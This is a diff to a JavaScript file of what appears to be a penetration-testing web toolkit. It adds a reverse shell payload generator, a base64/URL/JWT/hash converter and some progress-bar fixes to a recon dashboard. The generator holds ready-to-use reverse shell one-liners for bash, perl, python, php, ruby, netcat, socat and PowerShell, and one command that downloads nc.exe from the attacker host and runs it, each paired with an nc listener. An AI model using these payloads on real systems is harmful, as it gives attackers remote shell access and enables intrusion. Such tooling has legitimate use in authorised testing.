@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
         initThoughtBubbles();
         initPayloadGenerator();
         initDataConverter();
-        initChimera();
+        initChimera(); // Changed from initReconDashboard
     };
 
     const initDisclaimer = () => {
@@ -79,8 +79,128 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => { showThought(); setInterval(showThought, 15000); }, 2000);
     };
 
-    const initPayloadGenerator = () => { /* Existing Payload Generator Code */ };
-    const initDataConverter = () => { /* Existing Data Converter Code */ };
+    const initPayloadGenerator = () => {
+        const ipAddressEl = document.getElementById('ipAddress');
+        const portEl = document.getElementById('port');
+        const shellTypeEl = document.getElementById('shellType');
+        const osTypeEl = document.getElementById('osType');
+        const payloadTypeEl = document.getElementById('payloadType');
+        const outputCodeEl = document.getElementById('outputCode');
+        const listenerCommandEl = document.getElementById('listenerCommand');
+        const copyButton = document.getElementById('copyButton');
+        const obfuscateCaseEl = document.getElementById('obfuscateCase');
+        const obfuscateQuotesEl = document.getElementById('obfuscateQuotes');
+        const obfuscateCaretsEl = document.getElementById('obfuscateCarets');
+        const encodingTypeEl = document.getElementById('encodingType');
+
+        const payloadMap = {
+            linux: {
+                bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+                perl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
+                python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
+                php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");`,
+                ruby: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+                netcat: `nc -e /bin/sh {ip} {port}`,
+                socat: `socat TCP:{ip}:{port} EXEC:'bash -li'`
+            },
+            windows: {
+                powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+                cmd: `powershell -c "Invoke-WebRequest -Uri http://{ip}/nc.exe -OutFile C:\Users\Public\nc.exe; C:\Users\Public\nc.exe -e cmd.exe {ip} {port}"`
+            }
+        };
+
+        const listenerMap = {
+            linux: 'nc -lvnp {port}',
+            windows: 'nc -lvnp {port}'
+        };
+
+        const populatePayloads = () => {
+            const os = osTypeEl.value;
+            payloadTypeEl.innerHTML = '';
+            Object.keys(payloadMap[os]).forEach(p => {
+                const option = document.createElement('option');
+                option.value = p;
+                option.textContent = p.charAt(0).toUpperCase() + p.slice(1);
+                payloadTypeEl.appendChild(option);
+            });
+        };
+
+        const generatePayload = () => {
+            const ip = ipAddressEl.value;
+            const port = portEl.value;
+            const os = osTypeEl.value;
+            const payload = payloadTypeEl.value;
+            let command = payloadMap[os][payload].replace(/{ip}/g, ip).replace(/{port}/g, port);
+            outputCodeEl.textContent = command;
+            listenerCommandEl.textContent = listenerMap[os].replace('{port}', port);
+        };
+
+        osTypeEl.addEventListener('change', populatePayloads);
+        [ipAddressEl, portEl, shellTypeEl, osTypeEl, payloadTypeEl].forEach(el => el.addEventListener('change', generatePayload));
+        
+        populatePayloads();
+        generatePayload();
+    };
+
+    const initDataConverter = () => {
+        const inputEl = document.getElementById('converterInput');
+        const outputEl = document.getElementById('converterOutput');
+        const opButtons = document.querySelectorAll('#data-converter-module button[data-op]');
+        const swapButton = document.getElementById('swapButton');
+        const infoIcons = document.querySelectorAll('.info-icon');
+        const tooltip = document.getElementById('info-tooltip');
+        const tooltipTitle = document.getElementById('tooltip-title');
+        const tooltipInfo = document.getElementById('tooltip-info');
+
+        const operations = {
+            'b64-encode': (input) => btoa(input),
+            'b64-decode': (input) => atob(input),
+            'url-encode': (input) => encodeURIComponent(input),
+            'url-decode': (input) => decodeURIComponent(input),
+            'jwt-debug': (input) => {
+                try {
+                    const [header, payload, signature] = input.split('.');
+                    if (!header || !payload || !signature) return "Invalid JWT structure.";
+                    const decodedHeader = JSON.stringify(JSON.parse(atob(header.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
+                    const decodedPayload = JSON.stringify(JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
+                    return `Header:\n${decodedHeader}\n\nPayload:\n${decodedPayload}\n\nSignature:\n${signature}`;
+                } catch (e) {
+                    return "Invalid JWT Token";
+                }
+            },
+            'hash': async (algo, input) => {
+                const encoder = new TextEncoder();
+                const data = encoder.encode(input);
+                const hashBuffer = await crypto.subtle.digest(algo, data);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            }
+        };
+
+        opButtons.forEach(button => {
+            button.addEventListener('click', async () => {
+                const op = button.getAttribute('data-op');
+                const inputText = inputEl.value;
+                if (!inputText) return;
+                try {
+                    let result = '';
+                    const hashOps = { 'sha1': 'SHA-1', 'sha256': 'SHA-256', 'sha512': 'SHA-512' };
+                    if (op in hashOps) {
+                        result = await operations.hash(hashOps[op], inputText);
+                    } else if (op in operations) {
+                        result = operations[op](inputText);
+                    }
+                    outputEl.value = result;
+                } catch (e) {
+                    outputEl.value = `Error: ${e.message}`;
+                }
+            });
+        });
+
+        swapButton.addEventListener('click', () => {
+            [inputEl.value, outputEl.value] = [outputEl.value, inputEl.value];
+        });
+    };
 
     const initChimera = () => {
         const domainInput = document.getElementById('reconDomainInput');
@@ -99,12 +219,15 @@ document.addEventListener('DOMContentLoaded', () => {
         const toggleLoading = (isLoading, message = '') => {
             scanButton.disabled = isLoading;
             progressContainer.classList.toggle('d-none', !isLoading);
-            progressText.textContent = message;
-            progressBar.style.width = isLoading ? '0%' : '100%';
+            if(isLoading) {
+                progressText.textContent = message;
+                progressBar.style.width = '0%';
+            }
         };
 
         const updateProgress = (percentage, message) => {
-            progressBar.style.width = `${percentage}%`;
+            const bar = progressBar.querySelector('div');
+            if(bar) bar.style.width = `${percentage}%`;
             progressText.textContent = message;
         };
 
@@ -115,7 +238,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     shape: 'dot',
                     size: 16,
                     font: { color: '#e6edf3', size: 14 },
-                    borderWidth: 2,
+                    borderWidth: 2
                 },
                 edges: {
                     width: 2,
